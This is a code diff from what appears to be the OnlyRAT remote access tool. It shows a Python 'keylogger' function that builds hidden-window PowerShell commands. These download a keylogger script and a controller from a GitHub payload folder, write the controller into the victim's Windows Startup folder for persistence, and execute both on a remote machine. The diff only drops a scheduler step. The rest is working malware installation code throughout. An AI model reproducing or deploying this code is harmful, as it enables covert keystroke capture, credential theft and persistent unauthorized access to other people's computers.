@@ -144,15 +144,12 @@ def keylogger(address, password, username, working):
     print("\n[*] Prepping keylogger...")
     # web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
-    schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/schedule.ps1 -OutFile {working}/SSvmVmkWmv.ps1\""
     controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile GiLqXiexKP.cmd"
     print("[+] Keylogger prepped")
 
     # installing keylogger
     print("[*] Installing keylogger...")
     remote_command(address, password, keylogger_command)
-    print("[*] Installing schedueler...")
-    remote_command(address, password, schedule_command)
     print("[*] Installing controller...")
     remote_command(address, password, controller_command)
     print("[+] Keylogger installed sucessfully\n")
